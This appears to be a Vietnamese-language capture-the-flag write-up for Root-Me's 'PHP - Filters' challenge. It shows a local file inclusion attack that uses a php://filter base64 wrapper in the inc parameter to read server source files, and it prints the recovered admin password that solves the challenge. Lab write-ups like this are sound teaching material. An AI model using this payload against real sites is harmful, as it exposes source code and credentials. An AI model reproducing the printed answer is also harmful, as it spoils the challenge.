# [PHP - Filters](https://www.root-me.org/en/Challenges/Web-Server/PHP-Filters)

## Solutions

- Sử dụng dirsearch thì có thấy một file config.php

```text
200 -    0B  - /web-serveur/ch12/config.php
```

- Khi ấn vào nút login hoặc home thì thấy url có dạng `http://challenge01.root-me.org/web-serveur/ch12/?inc=accueil.php`

- Thay đổi query parameter:
  - inc=config.php: không có gì xảy ra
  - inc=../../: `open_basedir restriction in effect`, server không cho include file ngoài thư mục `/challenge/web-serveur/ch12`

- Tên đề bài là PHP - filters: thử dùng php wrapper với filter `convert.base64-encode`:
  - `inc=php://filter/convert.base64-encode/resource=login.php`: response có chứa một đoạn base64encoded, decode ra được:

    ```php
    <?php
    include("config.php");

    if ( isset($_POST["username"]) && isset($_POST["password"]) ){
        if ($_POST["username"]==$username && $_POST["password"]==$password){
        print("<h2>Welcome back !</h2>");
        print("To validate the challenge use this password<br/><br/>");
        } else {
        print("<h3>Error : no such user/password</h2><br />");
        }
    } else {
    ?>
    ```

  - Tương tự thử với `inc=php://filter/convert.base64-encode/resource=config.php` và cũng decode, ta lấy được credential:

  ```php
  <?php
  $username="admin";
  $password="DAPt9D2mky0APAF";
  ```

## References

- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Local%20File%20Inclusion.pdf?_gl=1>.
- <https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Remote%20File%20Inclusion%20and%20Local%20File%20Inclusion%20explained.pdf?_gl=1>.
- <https://medium0.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb>
